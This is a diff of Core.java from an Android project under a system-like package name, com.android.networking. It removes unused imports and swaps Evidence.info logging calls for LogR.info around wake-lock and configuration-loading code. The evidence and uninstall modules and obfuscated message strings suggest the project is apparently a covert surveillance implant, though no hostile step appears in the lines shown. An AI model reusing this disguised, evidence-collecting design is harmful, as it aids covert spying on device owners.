@@ -7,24 +7,12 @@
 
 package com.android.networking;
 
-import java.util.Collection;
-import java.util.List;
-import java.util.Map;
-import java.util.TreeMap;
-
 import android.app.Activity;
 import android.app.ActivityManager;
-import android.app.ActivityManager.RunningAppProcessInfo;
 import android.app.PendingIntent;
-import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
-import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.res.Resources;
-import android.net.wifi.ScanResult;
-import android.net.wifi.WifiManager;
-import android.os.Debug.MemoryInfo;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -34,13 +22,13 @@ import com.android.networking.action.UninstallAction;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfType;
 import com.android.networking.conf.Configuration;
-import com.android.networking.evidence.Evidence;
+import com.android.networking.evidence.EvDispatcher;
+import com.android.networking.evidence.LogR;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.manager.ManagerEvent;
 import com.android.networking.manager.ManagerModule;
-import com.android.networking.module.ModulePosition;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
@@ -137,7 +125,7 @@ public class Core extends Activity implements Runnable {
 		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
 		wl.acquire();
 
-		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
+		LogR.info(Messages.getString("30.1")); //$NON-NLS-1$
 
 		serviceRunning = true;
 		return true;
@@ -484,10 +472,10 @@ public class Core extends Activity implements Runnable {
 			loaded = loadConfFile(file, true);
 
 			if (!loaded) {
-				Evidence.info(Messages.getString("30.2")); //$NON-NLS-1$
+				LogR.info(Messages.getString("30.2")); //$NON-NLS-1$
 				file.delete();
 			} else {
-				Evidence.info(Messages.getString("30.3")); //$NON-NLS-1$
+				LogR.info(Messages.getString("30.3")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -504,7 +492,7 @@ public class Core extends Activity implements Runnable {
 				loaded = loadConfFile(file, true);
 
 				if (!loaded) {
-					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
+					LogR.info(Messages.getString("30.4")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
